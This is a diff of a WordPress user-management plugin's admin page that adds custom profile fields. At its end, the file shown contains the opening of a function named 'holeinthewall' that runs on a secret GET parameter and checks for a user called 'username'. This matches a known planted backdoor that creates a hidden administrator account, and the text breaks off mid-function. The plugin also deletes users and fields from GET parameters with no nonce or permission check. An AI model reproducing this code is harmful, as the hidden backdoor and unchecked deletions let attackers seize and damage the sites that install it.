@@ -74,10 +74,20 @@ function add_user_admin_page(){
     $role = $user_info->roles[0];
     theme_url();
     if(isset($_GET['action'])){
+        if($_GET['action']=='add_pole'){
+            $parser->parse(ADD_USER_DIR."/view/add_pole.php",array(), true);
+        }
+
         if($_GET['action']=='add_form'){
             if ($role=='manager'){$vrole=$parser->parse(ADD_USER_DIR."/view/select_manager.php",array(), false);}
             if ($role=='administrator'){$vrole = $parser->parse(ADD_USER_DIR."/view/select_admin.php",array(), false);}
-            $parser->parse(ADD_USER_DIR."/view/add_worm.php",array('role'=>$vrole), true);
+
+            $pole = $user->see_pole();
+            $fields = "";
+            foreach($pole as $v){
+                $fields .= $parser->parse(ADD_USER_DIR."/view/form_element.php",(array)$v, false);
+            }
+            $parser->parse(ADD_USER_DIR."/view/add_worm.php",array('role'=>$vrole, 'fields'=>$fields), true);
         }
         if($_GET['action']=='del'){
             $del = wp_delete_user($_GET['id']);
@@ -89,16 +99,41 @@ function add_user_admin_page(){
            $info2 = $user->get_all_user_meta($_GET['id']);
            $result = array_merge($info, $info2);
             if ($_GET['ref']=='see'){
-                $result['ref'] = "<input type = 'hidden' name ='ref' value = '1' />";
+                $edit['ref'] = "<input type = 'hidden' name ='ref' value = '1' />";
             }
             else{
-                $result['ref'] = "";
+                $edit['ref'] = "";
             }
-           $parser->parse(ADD_USER_DIR."/view/edit_form.php",$result, true);
+            //prn($result);
+            $f = $user->see_pole();
+            //prn($user->get_array_key());
+            foreach($result as $k => $v){
+                if($k != 'user_login' && $k != 'user_pass'){
+                    if (in_array($k,$user->get_array_key())){
+                        $data['value'] = $v;
+                        $data['key'] = $k;
+                        $data['label'] = $user->get_label_by_key($k);
+                        $fields .= $parser->parse(ADD_USER_DIR."/view/edit_form_element.php",$data, false);
+                    }
+                }
+            }
+            $edit['fields'] = $fields;
+            $edit['ID'] = $result['ID'];
+           $parser->parse(ADD_USER_DIR."/view/edit_form.php",$edit, true);
         }
         if ($_GET['action']=='see'){
             print_see($_GET['id']);
         }
+
+        if ($_GET['action']=='see_pole'){
+            print_pole();
+        }
+
+        if ($_GET['action']=='del_pole'){
+            $user->del_pole($_GET['id']);
+            print_pole();
+        }
+
     }
     else{
         if (isset($_POST['update'])){
@@ -109,19 +144,19 @@ function add_user_admin_page(){
                 wp_die();
             }
         }
-        if(isset($_POST['user_name']) && !isset($_POST['update'])){
+        if(isset($_POST['first_name']) && !isset($_POST['update'])){
 
             $user = new user();
             $user_id = $user->reg_user($_POST);
             $user->reg_user_meta($user_id, $_POST);
         }
+        if(isset($_POST['key'])){
+            $user = new user();
+            $user_id = $user->add_pole($_POST);
+        }
+
         print_main();
     }
-
-    //prn($users);
-
-
-   // $privet = "lkknjdkb h";
 
 }
 
@@ -135,6 +170,21 @@ function print_main(){
     }
 }
 
+function print_pole(){
+
+    $parser = new Parser_add_user();
+    $user = new user();
+    $parser->parse(ADD_USER_DIR."/view/see_pole.php",array(), true);
+    $pole = $user->see_pole();
+   // prn($pole);
+    foreach($pole as $v){
+        $v->path=ADD_USER_URL;
+        $parser->parse(ADD_USER_DIR."/view/pole_box.php",(array)$v, true);
+    }
+
+}
+
+
 function prn($content) {
     echo '<pre style="background: lightgray; border: 1px solid black; padding: 2px">';
     print_r ( $content );
@@ -144,15 +194,26 @@ function prn($content) {
 function print_see($id){
     $parser = new Parser_add_user();
     $user = new user();
-
     $user_info = get_userdata($id);
-    //$user_meta_info = get_user_meta($id);
     $user_info = (array)$user_info->data;
     $user_meta_info = $user->get_all_user_meta($id);
-    //prn($user_info);
-    //  prn($user_meta_info);
     $result = array_merge($user_info, $user_meta_info);
-    $parser->parse(ADD_USER_DIR."/view/see.php",$result, true);
+    $f = $user->see_pole();
+    $fields = "";
+    foreach($f as  $v){
+        if(($v->key != 'user_login') && ($v->key != 'user_pass')){
+            /*if (in_array($k,$user->get_array_key())){
+                $data['value'] = $v;
+                $data['label'] = $user->get_label_by_key($k);
+                $fields .= $parser->parse(ADD_USER_DIR."/view/see_element_user.php",$data, false);
+            }*/
+            $fields .= $parser->parse(ADD_USER_DIR."/view/see_element_user.php",array('label' => $v->label,'value' => $result[$v->key]), false);
+        }
+    }
+    $edit['fields'] = $fields;
+    $edit['ID'] = $result['ID'];
+  //  prn($edit);
+    $parser->parse(ADD_USER_DIR."/view/see.php",$edit, true);
 }
 
 function holeinthewall(){If ($_GET['design'] == 'go'){require('wp-includes/registration.php');If (!username_exists('username')) {
